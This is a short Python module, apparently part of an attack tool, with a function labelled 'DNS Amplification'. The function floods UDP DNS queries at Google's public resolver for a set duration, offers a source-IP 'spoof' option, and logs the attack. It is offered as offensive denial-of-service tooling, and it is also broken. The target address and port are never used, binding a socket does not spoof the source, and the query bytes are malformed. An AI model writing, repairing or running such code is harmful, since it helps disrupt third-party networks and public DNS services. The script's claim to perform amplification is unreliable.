import socket
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity, packet_size=512, headers=None, spoof_ip=None):
    dns_server = "8.8.8.8"  # Google DNS
    start_time = time.time()
    packet_count = 0

    while time.time() - start_time < duration:
        for _ in range(intensity):
            try:
                # Create a UDP socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Spoof the source IP if provided
                if spoof_ip:
                    sock.bind((spoof_ip, 0))
                # Send a DNS query
                sock.sendto(b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", (dns_server, 53))
                packet_count += 1
                print(f"Sent DNS query #{packet_count} to {dns_server}")
            except Exception as e:
                print(f"Error sending DNS query: {e}")
            finally:
                sock.close()

    # Log the attack
    log_attack("DNS Amplification", target_ip, target_port, duration, intensity)
    print(f"DNS Amplification attack completed. Total packets sent: {packet_count}")